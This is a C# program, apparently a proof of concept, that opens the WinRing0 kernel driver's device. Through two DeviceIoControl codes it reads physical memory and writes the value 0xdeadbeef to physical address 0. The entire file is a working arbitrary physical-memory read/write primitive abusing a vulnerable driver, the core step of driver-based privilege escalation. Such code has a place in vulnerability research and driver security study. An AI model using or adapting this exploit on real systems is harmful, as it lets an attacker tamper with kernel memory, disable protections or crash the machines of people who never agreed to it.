using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

class Program
{
    const string SymLinkName = @"\\.\WinRing0_1_2_0";
    static SafeFileHandle hDevice;

    [StructLayout(LayoutKind.Sequential)]
    struct DATA_READ_PA
    {
        public IntPtr PhysicalAddress;
        public int unit;
        public int size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct DATA_WRITE_PA
    {
        public IntPtr PhysicalAddress;
        public int unit;
        public int size;
        public int value;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(
        SafeFileHandle hDevice,
        uint dwIoControlCode,
        ref DATA_READ_PA lpInBuffer,
        int nInBufferSize,
        out int lpOutBuffer,
        int nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(
        SafeFileHandle hDevice,
        uint dwIoControlCode,
        ref DATA_WRITE_PA lpInBuffer,
        int nInBufferSize,
        IntPtr lpOutBuffer,
        int nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped
    );

    static void ReadPA_0x9C406104()
    {
        DATA_READ_PA data = new DATA_READ_PA
        {
            PhysicalAddress = IntPtr.Zero,
            unit = 1,
            size = 4
        };
        int output;
        uint dwWrite;

        bool result = DeviceIoControl(hDevice, 0x9C406104, ref data, Marshal.SizeOf(data), out output, sizeof(int), out dwWrite, IntPtr.Zero);
        if (result)
        {
            Console.WriteLine($"read physical memory at 0: {output:X}");
        }
        else
        {
            Console.WriteLine($"DeviceIoControl failed with error: {Marshal.GetLastWin32Error()}");
        }
    }

    static void WritePA_0x9C40A108()
    {
        DATA_WRITE_PA data = new DATA_WRITE_PA
        {
            PhysicalAddress = IntPtr.Zero,
            unit = 1,
            size = 4,
            // value = 0xdeadbeef
            value = Convert.ToInt32("deadbeef", 16),

        };
        uint dwWrite;

        bool result = DeviceIoControl(hDevice, 0x9C40A108, ref data, Marshal.SizeOf(data), IntPtr.Zero, 0, out dwWrite, IntPtr.Zero);
        if (result)
        {
            Console.WriteLine($"write physical memory into 0: {data.value:X}");
        }
        else
        {
            Console.WriteLine($"DeviceIoControl failed with error: {Marshal.GetLastWin32Error()}");
        }
    }

    static void Main(string[] args)
    {
        hDevice = CreateFile(SymLinkName, 0xC0000000, 0, IntPtr.Zero, 3, 0x00000080, IntPtr.Zero);
        if (hDevice.IsInvalid)
        {
            Console.WriteLine($"Get Driver Handle Error with Win32 error code: {Marshal.GetLastWin32Error():X}");
            Console.ReadKey();
            return;
        }

        ReadPA_0x9C406104();
        WritePA_0x9C40A108();
        ReadPA_0x9C406104();

        Console.ReadKey();
    }
}
